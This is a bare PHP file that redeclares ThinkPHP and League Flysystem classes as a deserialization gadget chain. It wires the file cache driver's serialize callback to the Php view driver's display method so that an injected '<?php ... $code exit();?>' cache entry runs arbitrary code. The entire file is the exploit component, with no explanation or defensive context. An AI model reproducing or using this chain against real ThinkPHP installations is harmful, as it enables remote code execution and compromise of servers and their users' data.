<?php 

namespace think\view\driver {
	class Php{}
}

namespace League\Flysystem\Cached\Storage{
	abstract class AbstractCache
	{
		protected $autosave = false;
	}
}

namespace think\filesystem{
	use League\Flysystem\Cached\Storage\AbstractCache;
	class CacheStore extends AbstractCache
	{
		protected $key = "1";
		protected $store;
		protected $cache;

		public function __construct($code, $store)
		{
			$this->cache = ["<?php ob_end_clear(); $code exit();?>"=>""];
			$this->store = $store;
		}
	}
}

namespace think\cache{
abstract class Driver
	{
		protected $options = ["serialize"=>[[]],"expire"=>1,"prefix"=>"1","hash_type"=>"sha256","cache_subdir"=>"1","path"=>"1"];
		function __construct() {
			$this->options["serialize"][0] = [new \think\view\driver\Php(), "display"];
		}
	}
}

namespace think\cache\driver{
	class File extends \think\cache\Driver{

	}
}